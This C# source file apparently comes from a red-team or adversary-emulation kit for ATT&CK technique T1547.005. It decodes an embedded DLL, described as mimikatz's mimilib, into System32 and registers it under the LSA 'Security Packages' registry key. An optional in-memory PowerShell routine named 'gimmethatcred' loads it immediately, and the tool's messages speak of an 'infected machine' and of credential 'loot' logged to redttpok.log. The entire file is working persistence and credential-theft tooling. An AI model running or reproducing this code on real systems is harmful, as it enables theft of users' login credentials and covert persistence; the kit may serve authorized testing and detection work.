using System;
using System.Collections.Generic;
using System.Management.Automation.Runspaces;
using System.IO;
using Microsoft.Win32;

class Technique {
    public static string sspName = "redttpok"; // Keep it static -> Must be the same that "InternalName" at the mimilib.rc file on mimikatz project
    public static Dictionary<string, string> EntryData { get; set; }
    public static Dictionary<string, string> ExitData { get; set; }

    public static string Base64Decode(string base64EncodedData) {
        var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
        return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
    }

    public static string Base64Encode(string plainText) {
        var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
        return System.Convert.ToBase64String(plainTextBytes);
    }

    public static bool usePowershellWithoutPowershell(string encoded) {

        try {
            string command = Base64Decode(encoded);
            RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
            Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
            rspace.Open();
            Pipeline pipeline = rspace.CreatePipeline();
            pipeline.Commands.AddScript(command);
            pipeline.Invoke();
            return true;
        } catch (Exception ex) {
            Console.WriteLine("[T1547-005] Error:" + ex);
        }
        return false;

    }

    public static void storeDll() {
        Console.WriteLine("[T1547-005] Setting path to store DLL");
        string systemPath = Environment.SystemDirectory + @"\";

        try {
            //string entData = EntryData.ContainsKey("sspname".ToLower()) ? EntryData["sspname"] : sspName;

            // Emula os valores do arquivo .flow
            string entData = "redttpok";  // entData == EntryData["sspname".ToLower()]
            string path = systemPath + (entData != "" ? entData : sspName);
            path = Path.GetExtension(path).Equals(true) ? path : path + ".dll";
            sspName = Path.GetFileNameWithoutExtension(path);

            // https://stackoverflow.com/questions/10100390/file-getting-copied-to-syswow64-instead-of-system32
            if (!File.Exists(path)) {
                Console.WriteLine("[T1547-005] Decoding DLL file to store on the disk");
                var dllDecoded = Convert.FromBase64String(T1547_005.Properties.Resources.conteudo);
                Console.WriteLine("[T1547-005] Content successfully decoded!");
                
                //Console.WriteLine(dllDecoded.ToString());

                Console.WriteLine("[T1547-005] Creating DLL file on the local disk");
                File.WriteAllBytes(path, dllDecoded);
                Console.WriteLine("[T1547-005] DLL file created!");
            }
        } catch (Exception ex) {
            Console.WriteLine("[T1547-005] ERROR when trying to store DLL: " + ex.Message);
            throw;
        }
    }

    public static void setKeyRegedit() {
        try {
            Console.WriteLine(@"[T1547-005] Setting keys at: SYSTEM\CurrentControlSet\Control\Lsa");
            RegistryKey rkey = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Lsa", true);
            rkey.SetValue("Security Packages", sspName);
            rkey.Close();
            Console.WriteLine("[T1547-005] key has been defined!");
        } catch (Exception ex) {
            Console.WriteLine("[T1547-005] Error - Key hasn't been defined: " + ex.Message);
            throw;
        }
    }

    public static void Main(string[] args) {
        if (args.Length > 0) {
            // Decode and store the DLL file on the disk
            storeDll();
            setKeyRegedit();

            if (args[0].ToLower() == "force") {
                Console.WriteLine("[T1547-005] 1st parameter defined as: force");
                Console.WriteLine("[T1547-005] Starting powershell execution to enforce SSP register");
                string GIMMECRED = Base64Encode(@"function gimmethatcred {$DllName = '" + sspName + "';$DynAssembly = New-Object System.Reflection.AssemblyName('SSPI2');$AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run);$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('SSPI2', $False);$TypeBuilder = $ModuleBuilder.DefineType('SSPI2.Secur32', 'Public, Class');$PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('AddSecurityPackage','secur32.dll','Public, Static',[Reflection.CallingConventions]::Standard,[Int32],[Type[]] @([String], [IntPtr]),[Runtime.InteropServices.CallingConvention]::Winapi,[Runtime.InteropServices.CharSet]::Auto);$Secur32 = $TypeBuilder.CreateType();if ([IntPtr]::Size -eq 4) {$StructSize = 20} else {$StructSize = 24};$StructPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($StructSize);[Runtime.InteropServices.Marshal]::WriteInt32($StructPtr, $StructSize);$RuntimeSuccess = $True;try {$Result = $Secur32::AddSecurityPackage($DllName, $StructPtr)} catch {$HResult = $Error[0].Exception.InnerException.HResult;Write-Warning 'Runtime loading of the SSP failed. (0x$($HResult.ToString('X8')))';Write-Warning 'Reason: $(([ComponentModel.Win32Exception] $HResult).Message)';$RuntimeSuccess = $False}if ($RuntimeSuccess) {Write-Verbose 'Installation and loading complete!'} else {Write-Verbose 'Installation complete! Reboot for changes to take effect.'}}gimmethatcred");
                usePowershellWithoutPowershell(GIMMECRED);

                Console.WriteLine("[T1547-005] PowerShell was executed successful!");
            } else {
                Console.WriteLine("[T1547-005] 1st parameter defined as: run");
                Console.WriteLine("[T1547-005] So, you need to restart the infected machine to start credentials gathering!");
            }

            Console.WriteLine("[T1547-005] All done! Enjoy your loot :D");
            Console.WriteLine(@"[T1547-005] It will be saved in: C:\Windows\System32\redttpok.log\n");
        } else {
            Console.WriteLine("[T1547-005] Argument invalid. Check readme examples and try again!");
        }
    }
}